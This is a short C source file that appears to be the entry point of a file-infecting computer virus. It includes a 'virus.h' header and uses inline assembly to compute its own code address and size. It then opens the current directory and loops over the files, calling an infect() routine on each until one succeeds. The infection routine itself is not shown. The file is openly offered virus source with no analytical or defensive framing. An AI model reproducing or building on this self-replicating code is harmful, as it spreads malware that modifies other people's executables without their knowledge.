/*
 *	By using this file, you agree to the terms and conditions set
 *	forth in the COPYING file which can be found at the top level
 *	of this distribution.
 */
#include<virus.h>

void SECTION(.text.start) start(void)
{
	unsigned int	addr, size;
	int		h, dir;
	char		buf[DIRENT_SIZE];

	asm volatile ("	call	1f
	1:		pop	%0
			sub	$(1b - start), %0
			mov	$(end - start), %1":"=r"(addr),"=r"(size));

	dir = '.';
	if ((h = open((char*)&dir, 0)) < 0)
		return;

	while (readdir(h, buf) == 1)
		if (infect(buf + DIRENT_DNAME, addr, size) == 1)
			break;
	close(h);
}

void SECTION(.text.end)	end(void){}
